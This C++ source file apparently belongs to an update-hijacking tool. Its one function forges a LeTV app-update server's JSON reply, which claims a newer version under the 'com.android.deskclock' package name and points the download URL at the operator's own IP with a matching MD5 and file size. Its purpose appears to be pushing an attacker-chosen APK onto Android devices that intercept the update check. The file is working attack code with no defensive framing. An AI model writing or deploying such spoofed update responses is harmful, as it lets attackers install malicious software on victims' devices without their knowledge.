
#include "MyLetvPlugin.h"
#include "../HttpUtils.h"

int MyLetvPlugin::prepareRespData(unsigned long ulIP, string filepath, string filename) {
	int ret = 0;

	int version = 97001;		//37001

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json;charset=utf-8\r\nContent-Length: %u\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{"
		"\"errno\": 10000,"
		"\"errmsg\" : \"\","
		"\"data\" : "
		"{"
		"\"upgradeType\": 3,"
		"\"apkVersion\" : %u,"
		"\"fileUrl\" : \"http://%s/%s\","
		"\"description\" : \"new version update\","
		"\"packageName\" : \"com.android.deskclock\","
		"\"fileMd5\" : \"%s\","
		"\"packageSize\" : \"%uB\","
		"\"otherdata\" : \"apkId=3657\\u0026planId=6037\\u0026packageName=com.android.deskclock\\u0026apkVersion=%u\\u0026channel=\\u0026flag=2\","
		"\"packageType\" : 1"
		"}"
		"}\r\n";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, version,
		szip.c_str(), filename.c_str(),m_szmd5,m_filesize,version);


	char lptmp[MAX_RESPONSE_HEADER_SIZE];
	int tmplen = sprintf_s(lptmp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	memcpy(m_lpResp, lptmp, tmplen);
	m_iRespSize = tmplen;

	return m_iRespSize;
}